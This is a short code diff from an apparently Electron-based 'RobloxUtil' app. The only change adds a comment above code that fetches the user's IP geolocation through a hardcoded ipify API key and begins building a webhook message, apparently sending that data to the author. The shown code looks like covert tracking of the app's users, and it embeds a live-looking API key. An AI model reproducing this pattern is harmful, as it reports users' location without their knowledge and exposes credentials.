@@ -136,6 +136,7 @@ function createWindow () {
       today = mm + '/' + dd + '/' + yyyy + " // " + h + ":" + m;
       // WEBHOOK
       
+      //You can remove this if you like...
       getJSON("https://geo.ipify.org/api/v1?apiKey=at_tdZUc3TSooQ13rZtYN7CsXMKXTNYc", function(error, data){
         const msg = new webhook.MessageBuilder()
                   .setName("RobloxUtil")
